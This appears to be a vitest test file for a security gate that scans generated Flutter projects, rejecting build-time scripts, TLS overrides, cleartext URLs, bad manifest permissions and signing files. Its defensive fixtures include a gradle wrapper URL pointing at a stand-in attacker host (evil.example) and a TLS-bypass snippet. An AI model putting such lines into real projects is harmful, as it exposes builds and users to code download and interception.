import { describe, expect, it } from 'vitest';
import { analyzeProject } from './analysis';
import { SAMPLE_MOBILE_SPEC } from '../fixtures/sample-spec';
import { generateFlutterProject } from './templates';

const base = () => generateFlutterProject(SAMPLE_MOBILE_SPEC);
const rules = (f: Record<string, string>) => analyzeProject(f).map((i) => i.rule);

describe('analysis gate: files that execute at build time are never accepted (P3-S06)', () => {
  it('the generated template itself is clean', () => expect(analyzeProject(base())).toEqual([]));
  it.each([
    ['android/app/build.gradle', 'apply plugin: "com.android.application"'],
    ['android/app/build.gradle.kts', 'plugins { }'],
    [
      'android/gradle/wrapper/gradle-wrapper.properties',
      'distributionUrl=https://evil.example/g.zip',
    ],
    ['ios/Podfile', "platform :ios, '13.0'"],
    ['ios/Runner.xcodeproj/project.pbxproj', '// pbx'],
    ['hook/build.dart', 'void main() {}'],
    ['pubspec_overrides.yaml', 'dependency_overrides: {}'],
    ['build.yaml', 'targets: {}'],
    ['tool/run.sh', '#!/bin/sh'],
    ['gradlew', '#!/bin/sh'],
    ['linux/CMakeLists.txt', 'project(x)'],
  ])('rejects %s', (path, text) => {
    const r = rules({ ...base(), [path]: text });
    expect(r.some((x) => x === 'platform_folder' || x === 'native_build_hook')).toBe(true);
  });
  it('rejects overriding TLS validation', () => {
    expect(
      rules({
        ...base(),
        'lib/net.dart': 'void f(){ client.badCertificateCallback = (c, h, p) => true; }',
      }),
    ).toContain('tls_validation_disabled');
    expect(
      rules({ ...base(), 'lib/net.dart': 'void f(){ HttpOverrides.global = X(); }' }),
    ).toContain('tls_validation_disabled');
  });
  it('rejects cleartext URLs but allows the emulator loopback', () => {
    expect(rules({ ...base(), 'lib/a.dart': "const u = 'http://api.example.com/x';" })).toContain(
      'cleartext_url',
    );
    expect(rules({ ...base(), 'lib/a.dart': "const u = 'http://10.0.2.2:4000/x';" })).not.toContain(
      'cleartext_url',
    );
  });
  it('validates tool/nuzm-mobile.json: bounded android/ios settings only, declared permissions only', () => {
    const f = base();
    const m = JSON.parse(f['tool/nuzm-mobile.json']!) as Record<string, unknown>;
    const withM = (x: Record<string, unknown>) => ({
      ...f,
      'tool/nuzm-mobile.json': JSON.stringify({ ...m, ...x }),
    });
    expect(
      rules(withM({ android: { minSdk: 23, compileSdk: 35 }, ios: { deploymentTarget: 14 } })),
    ).toEqual([]);
    expect(rules(withM({ android: { minSdk: 3 } }))).toContain('manifest_invalid');
    expect(rules(withM({ android: { signingConfig: 'release' } }))).toContain('manifest_invalid');
    expect(rules(withM({ permissions: ['internet', 'read_sms'] }))).toContain('manifest_invalid');
    expect(rules({ ...f, 'tool/nuzm-mobile.json': '{not json' })).toContain('manifest_invalid');
  });
  it('signing material and secrets are still refused (regression)', () => {
    expect(rules({ ...base(), 'android/key.properties': 'storePassword=x' })).toContain(
      'signing_material',
    );
    expect(rules({ ...base(), 'key.properties': 'storePassword=x' })).toContain('signing_material');
    expect(rules({ ...base(), 'release.keystore': 'x' })).toContain('signing_material');
  });
});

describe('deterministic project files', () => {
  it('two generations are byte-identical, sorted by path, LF-only', () => {
    const a = base();
    const b = base();
    expect(JSON.stringify(a)).toBe(JSON.stringify(b));
    const keys = Object.keys(a);
    expect(keys).toEqual([...keys].sort((x, y) => (x < y ? -1 : 1)));
    for (const [p, t] of Object.entries(a)) expect(t.includes('\r'), p).toBe(false);
  });
  it('the project never stores platform folders or build scripts (they come from the pinned toolchain)', () => {
    for (const p of Object.keys(base())) expect(/^(android|ios)\//.test(p), p).toBe(false);
  });
});
